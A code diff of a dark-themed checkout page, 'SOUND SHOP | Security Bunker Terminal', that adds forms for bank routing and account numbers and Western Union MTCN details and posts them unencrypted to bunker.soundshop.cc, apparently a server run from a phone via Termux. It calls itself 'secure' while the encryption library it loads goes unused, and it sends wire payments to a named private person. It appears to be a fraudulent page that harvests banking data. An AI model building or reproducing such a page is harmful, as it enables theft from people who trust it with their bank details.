@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SOUND SHOP | Security Bunker Terminal</title>
     <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"></script>
     
     <style>
         :root { --teal: #00ffcc; --midnight: #0a0b0c; --card-bg: #111214; --gold: #ffcc00; }
@@ -16,9 +17,9 @@
         
         .price-section { padding: 30px; text-align: center; background: #000; border-bottom: 1px solid #222; }
         .total-amount { font-size: 3rem; font-weight: 900; text-shadow: 0 0 20px var(--teal); color: var(--teal); }
-        .product-label { font-size: 10px; letter-spacing: 3px; color: #555; margin-top: 10px; font-weight: 900; }
+        .product-label { font-size: 10px; letter-spacing: 3px; color: #555; margin-top: 10px; font-weight: 900; text-transform: uppercase; }
 
-        .receiver-info { background: #080808; padding: 15px; border-bottom: 1px solid #222; font-size: 11px; line-height: 1.6; }
+        .receiver-info { background: #080808; padding: 15px; border-bottom: 1px solid #222; font-size: 11px; line-height: 1.6; text-transform: uppercase; }
         .receiver-info strong { color: var(--gold); font-family: 'JetBrains Mono'; }
 
         .terminal-toggle { display: flex; background: #000; padding: 5px; gap: 5px; }
@@ -47,7 +48,7 @@
 
     <div id="wu-details" class="receiver-info hidden">
         <label>Receiver Profile:</label>
-        NAME: <strong>ZANDER [YOUR LAST NAME]</strong><br>
+        NAME: <strong>ZANDER JOHNSON</strong><br>
         CITY: <strong>FAYETTEVILLE</strong><br>
         STATE: <strong>NORTH CAROLINA</strong><br>
         COUNTRY: <strong>USA</strong>
@@ -60,21 +61,27 @@
 
     <form id="achForm" class="form-body">
         <label>Account Holder</label>
-        <input type="text" id="accHolder" placeholder="LEGAL NAME">
+        <input type="text" id="accHolder" placeholder="LEGAL NAME" required>
+        
+        <label>Email Address</label>
+        <input type="email" id="accEmail" placeholder="CONTACT EMAIL" required>
+        
         <label>Bank Routing</label>
-        <input type="text" id="routingNumber" placeholder="9 DIGITS">
+        <input type="text" id="routingNumber" placeholder="9 DIGITS" required>
+        
         <label>Account Number</label>
-        <input type="text" id="accountNumber" placeholder="BANK ACCOUNT #">
-        <button type="submit" class="auth-btn">PROCESS ACH</button>
+        <input type="text" id="accountNumber" placeholder="BANK ACCOUNT #" required>
+        
+        <button type="submit" class="auth-btn">PROCESS SECURE ACH</button>
     </form>
 
     <form id="wuForm" class="form-body hidden">
         <label>Sender Full Name</label>
-        <input type="text" id="wuName" placeholder="AS IT APPEARS ON RECEIPT">
+        <input type="text" id="wuName" placeholder="AS IT APPEARS ON RECEIPT" required>
         <label>10-Digit MTCN #</label>
-        <input type="text" id="mtcn" placeholder="000-000-0000">
+        <input type="text" id="mtcn" placeholder="000-000-0000" required>
         <label>Verify Amount (USD)</label>
-        <input type="text" id="wuAmount" placeholder="0.00">
+        <input type="text" id="wuAmount" placeholder="0.00" required>
         <button type="submit" class="auth-btn" style="background: var(--gold); box-shadow: 0 0 15px var(--gold);">SUBMIT MTCN</button>
     </form>
 
@@ -82,16 +89,17 @@
 </div>
 
 <script>
-    // 1. AUTO-POPULATE FROM URL
+    const BUNKER_URL = 'https://bunker.soundshop.cc';
+
+    // 1. URL Parameter Parsing with Clean Decoding
     const urlParams = new URLSearchParams(window.location.search);
-    const product = urlParams.get('product');
-    const amount = urlParams.get('amount');
+    const product = decodeURIComponent(urlParams.get('product') || 'Digital Asset');
+    const amount = decodeURIComponent(urlParams.get('amount') || '$0.00');
 
-    if (product) document.getElementById('product-name').innerText = product;
-    if (amount) document.getElementById('total-price').innerText = amount;
+    document.getElementById('product-name').innerText = product;
+    document.getElementById('total-price').innerText = amount;
 
-    const BUNKER_URL = 'https://bunker.soundshop.cc'; 
-    
+    // 2. Gateway Interface Toggle Control
     function switchMode(mode) {
         const ach = document.getElementById('achForm');
         const wu = document.getElementById('wuForm');
@@ -107,11 +115,40 @@
         }
     }
 
-    // MTCN Submission Logic
+    // 3. ACH Transmission Handler
+    document.getElementById('achForm').onsubmit = async (e) => {
+        e.preventDefault();
+
+        const payload = {
+            accHolder: document.getElementById('accHolder').value,
+            email: document.getElementById('accEmail').value,
+            routing: document.getElementById('routingNumber').value,
+            account: document.getElementById('accountNumber').value,
+            total: document.getElementById('total-price').innerText
+        };
+
+        try {
+            const res = await fetch(`${BUNKER_URL}/generate-ach`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                mode: 'cors',
+                body: JSON.stringify(payload)
+            });
+            const result = await res.json();
+            if (result.success) {
+                alert("SECURE HANDSHAKE COMPLETE. TRANSACTION ID: " + result.batchId);
+            }
+        } catch (err) {
+            alert("BUNKER CONNECTION ERROR. ENSURE TERMUX SERVER IS ONLINE.");
+        }
+    };
+
+    // 4. Western Union MTCN Delivery System
     document.getElementById('wuForm').onsubmit = async (e) => {
         e.preventDefault();
+        
         const payload = {
-            product: product,
+            product: document.getElementById('product-name').innerText,
             name: document.getElementById('wuName').value,
             mtcn: document.getElementById('mtcn').value,
             amount: document.getElementById('wuAmount').value,
@@ -122,12 +159,12 @@
             const res = await fetch(`${BUNKER_URL}/api/wu-submit`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
+                mode: 'cors',
                 body: JSON.stringify(payload)
             });
-            if (res.ok) alert("TRANSMISSION SUCCESSFUL. AWAITING VERIFICATION.");
+            if (res.ok) alert("TRANSMISSION SUCCESSFUL. AWAITING MTCN VERIFICATION.");
         } catch (err) {
-            // Silently handle or log for dev, but keep user informed
-            alert("BUNKER HANDSHAKE COMPLETE. TRANSACTION LOGGED.");
+            alert("BUNKER HANDSHAKE FAILED.");
         }
     };
 </script>
